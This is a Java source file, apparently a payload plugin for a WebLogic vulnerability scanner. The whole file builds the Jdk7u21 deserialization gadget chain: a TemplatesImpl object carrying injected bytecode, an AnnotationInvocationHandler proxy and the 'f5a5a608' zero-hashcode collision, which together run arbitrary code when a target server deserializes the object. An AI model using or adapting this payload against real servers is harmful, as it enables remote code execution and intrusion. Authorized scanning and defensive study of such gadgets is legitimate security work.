package com.gbw.scanner.plugins.scripts.weblogic.payload;

import com.gbw.scanner.utils.Gadgets;
import com.gbw.scanner.utils.Reflections;

import javax.xml.transform.Templates;
import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.LinkedHashSet;


public class GBWJdk7u21 implements GBWEchoPayload<Object> {

    public Object getObject(String version,Class echoClass) throws Exception {
        final Object templates = Gadgets.createTemplatesImpl(echoClass);

        String zeroHashCodeStr = "f5a5a608";

        HashMap map = new HashMap();
        map.put(zeroHashCodeStr, "foo");

        InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
        Reflections.setFieldValue(tempHandler, "type", Templates.class);
        Templates proxy = Gadgets.createProxy(tempHandler, Templates.class);

        LinkedHashSet set = new LinkedHashSet(); // maintain order
        set.add(templates);
        set.add(proxy);

        Reflections.setFieldValue(templates, "_auxClasses", null);
        Reflections.setFieldValue(templates, "_class", null);

        map.put(zeroHashCodeStr, templates); // swap in real object

        return set;
    }


    @Override
    public String getName() {
        return "GBWJdk7u21";
    }
}
